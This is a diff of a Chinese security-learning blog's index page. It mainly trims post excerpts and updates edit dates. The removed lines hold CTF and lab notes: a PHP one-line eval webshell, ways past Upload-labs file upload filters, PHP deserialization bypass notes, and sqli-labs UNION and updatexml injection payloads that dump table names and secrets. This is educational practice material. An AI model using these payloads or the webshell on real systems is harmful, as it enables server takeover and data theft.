@@ -281,10 +281,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-03-08 18:26:01 / Modified: 19:11:18" itemprop="dateCreated datePublished" datetime="2022-03-08T18:26:01+08:00">2022-03-08</time>
+      <time title="Created: 2022-03-08 18:26:01" itemprop="dateCreated datePublished" datetime="2022-03-08T18:26:01+08:00">2022-03-08</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2025-07-26 10:43:09" itemprop="dateModified" datetime="2025-07-26T10:43:09+08:00">2025-07-26</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -309,12 +315,14 @@
 <h1 id="关于明文攻击一些不得不说的内容"><a href="#关于明文攻击一些不得不说的内容" class="headerlink" title="关于明文攻击一些不得不说的内容"></a>关于明文攻击一些不得不说的内容</h1><h2 id="明文攻击的条件："><a href="#明文攻击的条件：" class="headerlink" title="明文攻击的条件："></a>明文攻击的条件：</h2><p>一个压缩包，和拥有一个已知的存在压缩中出现的文件。</p>
 <h2 id="明文攻击的原理："><a href="#明文攻击的原理：" class="headerlink" title="明文攻击的原理："></a>明文攻击的原理：</h2><p>将已知文件进行ZIP加密后和待解密的ZIP里已知文件进行hex对比，两者的区别就是ZIP加密的三个key(压缩包中的每个文件都是通过这三个Key进行加密压缩的)，由此得到加密文件的三个key。（一个非常抽象的概念，就是由结果来推理过程吧）</p>
 <p>你输入的密码，首先被转换成3个32bit的key，所以可能的key的组合是2^96，这是个天文数字，如果用暴力穷举的方式是不太可能的，除非你的密码比较短或者有个厉害的字典。压缩软件用这3个key加密所有包中的文件，这也就是说，所有文件的key是一样的，如果我们能够找到这个key，就能解开所有的文件。如果我们找到加密压缩包中的任意一个文件，这个文件和压缩包里的文件是一样的，我们把这个文件用同样的压缩软件同样的压缩方式进行无密码的压缩，得到的文件就是我们的Known  plaintext。用这个无密码的压缩包和有密码的压缩包进行比较，分析两个包中相同的那个文件，抽取出两个文件的不同点，就是那3个key了，如此就能得到key。两个相同文件在压缩包中的字节数应该相差12个byte，就是那3个key了。虽然我们还是无法通过这个key还原出密码，但是我们已经可以用这个key解开所有的文件，所以已经满足我的要求了，而且要以前的密码也没什么用呀，我只要文件。</p>
-<h2 id="明文攻击的工具："><a href="#明文攻击的工具：" class="headerlink" title="明文攻击的工具："></a>明文攻击的工具：</h2><p>AZPR</p>
-<h2 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h2><p>1.zip</p>
-<p><img src="https://s2.loli.net/2022/03/08/ygYIGuEBMwbHUpv.png" alt="QQ截图20220308190551.png"></p>
-<p>查看文件，我们要解压的1.zip中也存在《青玉案元夕》于是我们用相同的方式进行压缩</p>
-<p>然后进行明文攻击。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/08/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -371,7 +379,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-03-03 10:31:28" itemprop="dateModified" datetime="2022-03-03T10:31:28+08:00">2022-03-03</time>
+        <time title="Modified: 2025-07-26 10:43:19" itemprop="dateModified" datetime="2025-07-26T10:43:19+08:00">2025-07-26</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -394,38 +402,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>**因为看到misc题目要手写脚本打开压缩包，于是想系统地学习一下python的zipfile模块，<del>顺便水一篇博客</del>**，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43677350/article/details/84071552?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">参考zipfile zip文件操作</a></p>
-<h1 id="zipfile"><a href="#zipfile" class="headerlink" title="zipfile"></a>zipfile</h1><h2 id="zipfile-getinfo-name"><a href="#zipfile-getinfo-name" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能：获取zip文档內指定对象文件的信息。返回一个zipfile.zipinfo对象，它包含文件的详细信息。</p>
-<h2 id="zipfile-infolist"><a href="#zipfile-infolist" class="headerlink" title="zipfile.infolist()"></a>zipfile.infolist()</h2><p>功能：获取zip文档內所有文件的信息返回一个zipfile.zipinfo列表</p>
-<h2 id="zipfile-namelist"><a href="#zipfile-namelist" class="headerlink" title="zipfile.namelist()"></a>zipfile.namelist()</h2><p>功能：获取zip文档內所有文件的名称列表。</p>
-<h2 id="zipfile-extract-memeber-path-pwd"><a href="#zipfile-extract-memeber-path-pwd" class="headerlink" title="zipfile.extract(memeber[,path[,pwd]])"></a>zipfile.extract(memeber[,path[,pwd]])</h2><p>功能：将zip文件內的制定文件解压到当前目录。</p>
-<p>参数：</p>
-<p>memeber      指定要解压的文件名称或对应的zipinfo对象</p>
-<p>path               指定解析文件保存的文件夹</p>
-<p>pwd                解压密码</p>
-<h2 id="zipfile-extractall-path-memebers-pwd"><a href="#zipfile-extractall-path-memebers-pwd" class="headerlink" title="zipfile.extractall([path[,memebers[,pwd]]])"></a>zipfile.extractall([path[,memebers[,pwd]]])</h2><p>功能：解压zip文档中的所有文件到当前目录。</p>
-<h2 id="zipfile-printdir"><a href="#zipfile-printdir" class="headerlink" title="zipfile.printdir()"></a>zipfile.printdir()</h2><p>功能：将zip文档內的信息打印到控制台上。</p>
-<h2 id="zipfile-setpassword-pwd"><a href="#zipfile-setpassword-pwd" class="headerlink" title="zipfile.setpassword(pwd)"></a>zipfile.setpassword(pwd)</h2><p>功能：设置zip文档的密码。</p>
-<h2 id="zipfile-read-name-pwd"><a href="#zipfile-read-name-pwd" class="headerlink" title="zipfile.read(name[,pwd])"></a>zipfile.read(name[,pwd])</h2><p>功能：获取zip文档指定文件的二进制数据。 </p>
-<h2 id="zipfile-getinfo-name-1"><a href="#zipfile-getinfo-name-1" class="headerlink" title="zipfile.getinfo(name)"></a>zipfile.getinfo(name)</h2><p>功能返回一个zipinfo对象，表示zip文档中相对应的文件信息。</p>
-<p>支持以下属性：</p>
-<p>zipinfo.filename           获取文件的名称</p>
-<p>zipinfo.date_time        获取文件最后的修改时间。返回一个包含6个元素的元组：（年，月，日，时，分，秒）</p>
-<p>zipinfo.compress_type  压缩类型</p>
-<p>zipinfo.comment           文档说明</p>
-<p>zipinfo.extr                    文件的扩展数据</p>
-<p>zipinfo.create_system   获取创建文件的系统</p>
-<p>zipinfo.create_version   获取创建文件的PKZIP版本</p>
-<p>zipinfo.extract_versio      获取创建、解压zip文档的PKZIP所需要的PKZIP版本</p>
-<p>zipinfo.reserved               预留字段，当前实现总是返回0</p>
-<p>zipinfo.flag_bites              zip标志位</p>
-<p>zipinfo.volume                  文件头的卷标</p>
-<p>zipinfo.internal_attr           内部属性</p>
-<p>zipinfo.external_attr           外部属性</p>
-<p>zipinfo.header_offset          文件头偏移位</p>
-<p>zipinfo.CRC                        未压缩文件的CRC-32</p>
-<p>zipinfo.conpress_size          获取压缩后的大小</p>
-<p>zipinfo.file_size                     获取未压缩文件的大小</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/02/python%E4%B9%8Bzipfile%E5%BA%93/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -482,7 +466,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-03-01 19:32:30" itemprop="dateModified" datetime="2022-03-01T19:32:30+08:00">2022-03-01</time>
+        <time title="Modified: 2025-07-26 10:44:08" itemprop="dateModified" datetime="2025-07-26T10:44:08+08:00">2025-07-26</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -513,24 +497,14 @@
 <li>数字水印的隐写</li>
 <li>图片容差的隐写</li>
 </ol>
-<h1 id="第一部分-附加的图片隐写"><a href="#第一部分-附加的图片隐写" class="headerlink" title="第一部分 附加的图片隐写"></a>第一部分 附加的图片隐写</h1><p>在附加式的图片隐写术中，我们通常是用某种程序或者某种方法在裁体的文件中直接加上需要隐写的目标，然后将截体文件直接传输到接收者或者发布到网站上然后接收者根据方法提取出被隐写的对象，这一个过程就是我们这里想提到的附加图片隐写。</p>
-<p>而在CTF赛事中，关于这种图片隐写的大概有两种经典方法，一是直接附加字符串，二是图种的形式出现</p>
-<ol>
-<li>用binwalk来打开</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/01/kNydwRV14BJz2H6.png" alt="QQ截图20220301185619.png"></p>
-<p><img src="https://s2.loli.net/2022/03/01/LS9dgk3inla5QXz.jpg" alt="cqzb.jpg"></p>
-<p>就能得到</p>
-<p><img src="https://s2.loli.net/2022/03/01/oH239L6ycYkbQdm.png" alt="QQ截图20220301185751.png"></p>
-<p>利用linux的strings命令，对该图片进行处理</p>
-<p><img src="https://s2.loli.net/2022/03/01/RU8xagd4e1hk95V.jpg" alt="ctf.jpg"></p>
-<p>可以提取出字符串ZmxhZ3t3ZWxjb21lX3RvX3hpYW56aGl9</p>
-<p><img src="https://s2.loli.net/2022/03/01/xGvKqLwdYznQmAU.png" alt="QQ截图20220301191713.png"></p>
-<p>利用base64解密</p>
-<p><img src="https://s2.loli.net/2022/03/01/YOmQu87VwUok2vi.png" alt="QQ截图20220301192936.png"></p>
-<p>就可以看到flag。</p>
-<p><img src="https://s2.loli.net/2022/03/01/d2tOADlb7Kq4m6F.png" alt="QQ截图20220301193040.png"></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/27/misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -579,10 +553,16 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-02-26 15:56:43 / Modified: 16:23:38" itemprop="dateCreated datePublished" datetime="2022-02-26T15:56:43+08:00">2022-02-26</time>
+      <time title="Created: 2022-02-26 15:56:43" itemprop="dateCreated datePublished" datetime="2022-02-26T15:56:43+08:00">2022-02-26</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2025-07-26 10:44:33" itemprop="dateModified" datetime="2025-07-26T10:44:33+08:00">2025-07-26</time>
+      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -606,22 +586,14 @@
           <h1 id="一道目标明确的流量包取证"><a href="#一道目标明确的流量包取证" class="headerlink" title="一道目标明确的流量包取证"></a>一道目标明确的流量包取证</h1><p>首先用wireshark打开流量包一看是get型请求的联合查询注入，搜索http来过滤信息</p>
 <p><img src="https://s2.loli.net/2022/02/26/xmu52Gs7EHyw9p6.png" alt="QQ截图20220226104603.png"></p>
 <p>然后就打开ok后缀的请求包（肯定是从后往前找）</p>
-<p>率先找到后半段flag</p>
-<img src="https://s2.loli.net/2022/02/26/P1FfvW9am3DUoB5.png" alt="QQ截图20220226101554.png" style="zoom:200%;" />
-
-<p>往前找还有前半段</p>
-<img src="https://s2.loli.net/2022/02/26/v3CpGuLYkd7R84N.png" alt="QQ截图20220226103012.png" style="zoom:200%;" />
-
-<p>千万别急，有坑啊，发现前半段和后半段都有重复的地方，所以组合起来是：flag{698b0a3e29c5b0861a2d85fb14c2e2e9}</p>
-<p>之前在buu上刷过一题更难的一题，有点类似，是叫sqltest的基于get型的时间盲注的流量包取证有点小离谱</p>
-<h1 id="一道令人头皮发麻的签到："><a href="#一道令人头皮发麻的签到：" class="headerlink" title="一道令人头皮发麻的签到："></a>一道令人头皮发麻的签到：</h1><p>好！签到题，自信满满的打开，第一层解压：flag在里面哦</p>
-<p>第二层：打开看看（zip伪加密）</p>
-<p>第三层：你这么聪明看看就懂了  乱码，好！直接夹断😂</p>
-<p>原本想一个一个去试一试，试一下是啥编码的但是看到</p>
-<img src="https://s2.loli.net/2022/02/26/NMQc483tLwuKTB5.png" alt="QQ截图20220226161808.png" style="zoom;" />
-
-<p>5m在打开的一瞬间我的电脑卡了，所有的在线翻译网站都被搞爆了，就离谱😂</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/26/misc%E8%80%83%E6%A0%B8/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -752,7 +724,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-04-21 21:12:50" itemprop="dateModified" datetime="2022-04-21T21:12:50+08:00">2022-04-21</time>
+        <time title="Modified: 2025-07-26 10:45:24" itemprop="dateModified" datetime="2025-07-26T10:45:24+08:00">2025-07-26</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -776,38 +748,14 @@
     <div class="post-body" itemprop="articleBody">
           <h1 id="UPload-libs（pass-1-3）"><a href="#UPload-libs（pass-1-3）" class="headerlink" title="UPload-libs（pass 1-3）"></a>UPload-libs（pass 1-3）</h1><p><img src="https://s2.loli.net/2022/02/23/HnJ8XdQLS2UgyIG.png" alt="QQ截图20220223121036.png"></p>
 <p>  在这里我们搭建网站学习上传文件（病毒）</p>
-<p>首先学习一句话木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(_POST[<span class="string">&#x27;wds5418&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p> 文件上传漏洞是指程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过自身权限向服务器上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者webshell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理，解释文件。如果服务器处理的逻辑做的不够安全，则会导致严重后果。</p>
-<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>webshell就是以asp、php、jsp或者cgi等网页文件存在的一种命令执行环境，也可以将其称为后门。攻击者在入侵了一个网站后通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网页服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。webshell后门隐蔽行高，可以轻松穿越防火墙，访问webshell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录。</p>
-<h1 id="pass-1-前端js验证"><a href="#pass-1-前端js验证" class="headerlink" title="pass-1(前端js验证)"></a>pass-1(前端js验证)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>法1：这一关仅仅只在前端(在查看源代码中可以看到)进行的js校验，因此可以直接对上传的内容进行抓包</p>
-<img src="https://s2.loli.net/2022/02/23/12yxLEuaql8kw5J.png" alt="QQ截图20220223120523.png" style="zoom:150%;" />
-
-<p>对filename进行改名，将“muna.png”改成“muma.php”来使的上传的一句话木马可以执行</p>
-<p>然后就可以连接蚁🗡了</p>
-<p>法二：<a target="_blank" rel="noopener" href="https://blog.csdn.net/chuan6699/article/details/84693236?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">浏览器禁用javascript</a>就可以绕过前端的js校验</p>
-<h2 id="js前端校验存在的必要"><a href="#js前端校验存在的必要" class="headerlink" title="js前端校验存在的必要"></a>js前端校验存在的必要</h2><p>前端校验绕过的方法十分简单（极容易遭受攻击），但是它并不是没有存在的必要。之所以使用前端校验的方法，主要是因为效率高，用户体验好，如果所有的数据都发给服务器，再由服务器校验完之后再发给客户端，这中间需要消耗时间，用户的体验就变的不好，所以这种校验方式主要出现于CS架构的游戏类开发。但这种校验方式的开发的初衷是针对中规中矩的普通用户，当面对黑客这类群体的时候就会变得形同虚设。</p>
-<h1 id="pass-2（MIME验证）"><a href="#pass-2（MIME验证）" class="headerlink" title="pass-2（MIME验证）"></a>pass-2（MIME验证）</h1><p>用pass-1的法一也可以，将php的后缀先改成png然后在抓包处修改文件名后缀</p>
-<p>法二：在Content-Type：处将application/octet-stream改成image/jpeg</p>
-<img src="https://s2.loli.net/2022/02/23/sFrlUw9OG8LV3gK.png" alt="QQ截图20220223153025.png" style="zoom:150%;" />
-
-<h2 id="MIME验证科普："><a href="#MIME验证科普：" class="headerlink" title="MIME验证科普："></a>MIME验证科普：</h2><p>mime的作用：使客户端软件，区分不同的文件类型，例如web浏览器就是通过mime类型来判断文件是GIF图片还是可以打印的POSTSCRIPT文件。<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45728976/article/details/104333199?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">参考</a></p>
-<h1 id="pass-3-黑名单验证，特殊后缀"><a href="#pass-3-黑名单验证，特殊后缀" class="headerlink" title="pass-3 (黑名单验证，特殊后缀)"></a>pass-3 (黑名单验证，特殊后缀)</h1><img src="https://s2.loli.net/2022/02/23/h6mbq9c3woXykEK.png" alt="QQ截图20220223162004.png" style="zoom:150%;" />
-
-<p>法1：可以将一句话木马的文件后缀改成.php5</p>
-<p>法2：或者上传.htaccess文件来进绕过</p>
-<h2 id="基于文件后缀名的验证介绍"><a href="#基于文件后缀名的验证介绍" class="headerlink" title="基于文件后缀名的验证介绍"></a>基于文件后缀名的验证介绍</h2><p>分类：</p>
-<ol>
-<li>基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</li>
-<li>基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。</li>
-</ol>
-<p>可以利用Burpsuite工具截断HTTP请求，利用Intruder模块进行枚举后缀名，寻找黑名单中没有过滤的文件后缀。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/22/upload-libs(1)/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -864,7 +812,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-20 19:17:10" itemprop="dateModified" datetime="2022-02-20T19:17:10+08:00">2022-02-20</time>
+        <time title="Modified: 2025-07-26 10:46:02" itemprop="dateModified" datetime="2025-07-26T10:46:02+08:00">2025-07-26</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -888,28 +836,14 @@
     <div class="post-body" itemprop="articleBody">
           <h1 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h1><p>序列化，即将php对象转换成字符串的一种操作，目的是为了有效地保护对象，并且不丢失其类型和结构</p>
 <p>反序列化，即将符合格式的字符串转换为php对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件来完成</p>
-<h2 id="序列化后"><a href="#序列化后" class="headerlink" title="序列化后"></a>序列化后</h2><p>O:4:”text”:3:{s:10:”textflag”;s:7:”*text”;s:4:”text”;s:5:”text1”;}</p>
-<p>String:s</p>
-<p>Integer:i</p>
-<p>Boolean:b</p>
-<p>Null:N</p>
-<p>Array:a</p>
-<p>Object:o</p>
-<p><img src="https://s2.loli.net/2022/02/19/IJe93ycmFqKSOWs.png" alt="QQ截图20220219185351.png"></p>
-<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ol>
-<li>__construct()   //当对象创建的时候自动调用（但是在unserialize()时是不会自动调用的）</li>
-<li>__wakeup()//当unserialize()时自动调用</li>
-<li>__destruct()//当对象被销毁时自动调用</li>
-<li>__toString()//当反序化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li>
-<li>__get()//当从不可访问的属性读取数据</li>
-<li>__call()//在上下文中调用不可访问方法时触发</li>
-</ol>
-<h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="__wakeup()绕过"></a>__wakeup()绕过</h2><p>php5&lt;5.6.25</p>
-<p>php7&lt;7.0.10</p>
-<p>unserialize（）会检查一个__wakeup()方法，如果存在，则会先调用—-wakeup()方法，预先准备对象需要的资源</p>
-<p>反序列化时，如果对象属性个数值大于真实的属性个数时就会跳过__wakeup()的执行</p>
-<h2 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h2><p>POP面向属性编程常用于上层语言构造特定调用连的方法，与二进制利用中的面向返回编程的原理相同，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，最终达到攻击者的目的。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/18/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -966,7 +900,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-02-18 20:55:56" itemprop="dateModified" datetime="2022-02-18T20:55:56+08:00">2022-02-18</time>
+        <time title="Modified: 2025-07-26 10:46:13" itemprop="dateModified" datetime="2025-07-26T10:46:13+08:00">2025-07-26</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -992,49 +926,14 @@
 <p>?id=1</p>
 <p><img src="https://s2.loli.net/2022/02/18/I8q1zRoJSOjFfXU.png" alt="QQ截图20220218184638.png"></p>
 <p>?id=1’ order by 3–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/9xHlZKoG5D3qtaE.png" alt="QQ截图20220218184904.png"></p>
-<p>?id=1’ order by 4–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/qNX9eOfsVoZvgc3.png" alt="QQ截图20220218185026.png"></p>
-<p>?id=-1’ union select 1,2,3–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/3OcyfzZQ9Xgtb8C.png" alt="QQ截图20220218185205.png"></p>
-<p>?id=-1’ union select 1,2,database()–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/wRpsKIhYciHz5WB.png" alt="QQ截图20220218185315.png"></p>
-<p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/w6FYqVcPNrBStCk.png" alt="QQ截图20220218192118.png"></p>
-<p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’t87qfwjwea’–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/lQUgki1Z3PdKsOx.png" alt="QQ截图20220218191401.png"></p>
-<p>?id=-1’ union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_X1KA))from challenge.t87qfwjwea–+</p>
-<p><img src="https://s2.loli.net/2022/02/18/9vaJbfgKRrhU2tA.png" alt="QQ截图20220218192008.png"></p>
-<p>唯一要说的就是这关如果注入超过十次，表名和字段就会变非常恶心</p>
-<h1 id="lesson55"><a href="#lesson55" class="headerlink" title="lesson55"></a>lesson55</h1><p>?id=-1) union select 1,2,database()–+</p>
-<p>?id=-1) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p>?id=-1) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’7lyan613nt’–+</p>
-<p>?id=-1) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_W8HV))from challenges.7lyan613nt–+</p>
-<h1 id="lesson56"><a href="#lesson56" class="headerlink" title="lesson56"></a>lesson56</h1><p>?id=-1’) union select 1,2,database()–+</p>
-<p>?id=-1’) union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p>?id=-1’) union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’lby5b1quon’–+</p>
-<p>?id=-1’) union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_6JN1))from challenges.lby5b1quon–+</p>
-<h1 id="lesson-57"><a href="#lesson-57" class="headerlink" title="lesson 57"></a>lesson 57</h1><p>?id=-1” union select 1,2,database()–+</p>
-<p>?id=-1” union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
-<p>?id=-1” union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’2by8hxznwc’–+</p>
-<p>?id=-1” union select 1,2,group_concat(concat_ws(0x7e,sessid,secret_LXMN))from challenges.2by8hxznwc–+</p>
-<h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58"></a>lesson58</h1><p>?id=1’and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’6kkc70flk9’),0x7e),1)–+</p>
-<p>?id=1’and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JXDL))from challenges.6kkc70flk9),0x7e),1)–+</p>
-<h1 id="lesson59"><a href="#lesson59" class="headerlink" title="lesson59"></a>lesson59</h1><p>?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’062lvunx5i’),0x7e),1)–+</p>
-<p>?id=1 and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_2XKL))from challenges.062lvunx5i),0x7e),1)–+</p>
-<h1 id="lesson-60"><a href="#lesson-60" class="headerlink" title="lesson 60"></a>lesson 60</h1><p>?id=1”) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p>
-<h1 id="lesson-61"><a href="#lesson-61" class="headerlink" title="lesson 61"></a>lesson 61</h1><p>?id=1’)) and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>
-<p>?id=1’)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=’qlbva5vmrz’),0x7e),1)–+</p>
-<p>?id=1”) and updatexml(1,concat(0x7e,(select group_concat(concat_ws(0x7e,sessid,secret_JCJO))from challenges.qlbva5vmrz),0x7e),1)–+</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/02/08/lesson50/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1091,7 +990,7 @@
